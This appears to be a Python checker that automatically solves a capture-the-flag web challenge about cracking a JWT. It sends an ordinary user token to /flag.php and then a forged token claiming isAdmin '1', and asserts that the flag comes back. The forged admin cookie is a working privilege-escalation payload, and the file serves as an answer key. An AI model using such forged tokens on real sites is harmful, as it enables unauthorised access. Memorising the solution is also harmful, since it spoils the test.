import requests

from inspectors.web import WebChallengeInspector


class CrackJwtInspector(WebChallengeInspector):
    def solve(self) -> bool:
        try:
            general_user_res = requests.get(f'{self.url}/flag.php', cookies={
                'token': 'eyJhbGciOiJzaGEyNTYiLCJ0eXAiOiJKV1QifQ.eyJpc0FkbWluIjoiMCJ9.Yzc5Y2Y2MzlkYjkyNjdjZDkwNzJhNDkyODU0ZTE0ZWYwOTI2NDI3NTlkN2M0YmViN2Y1NDBjOTU4NWYzNzFjYg'})
            assert 'Please come back' in general_user_res.text, f'repr({general_user_res.text=})'

            admin_res = requests.get(f'{self.url}/flag.php', cookies={
                'token': 'eyJhbGciOiJzaGEyNjUiLCJ0eXAiOiJKV1QifQ.eyJpc0FkbWluIjoiMSJ9.ZmZkYjlhNDA5YjQ5MTVmNTFmMWFkZDUzY2Y2MGQ1ZDRjZWRlODFlNmE3YTQ4MWZhMzAyNDM3YmY5YWM5NTExYw'})
            assert self.flag in admin_res.text, f'repr({admin_res.text=})'

            self.logger.info(self.msg_succeeded_to_solve())
            return True
        except Exception:
            self.logger.warning(self.msg_failed_to_solve())
            return False
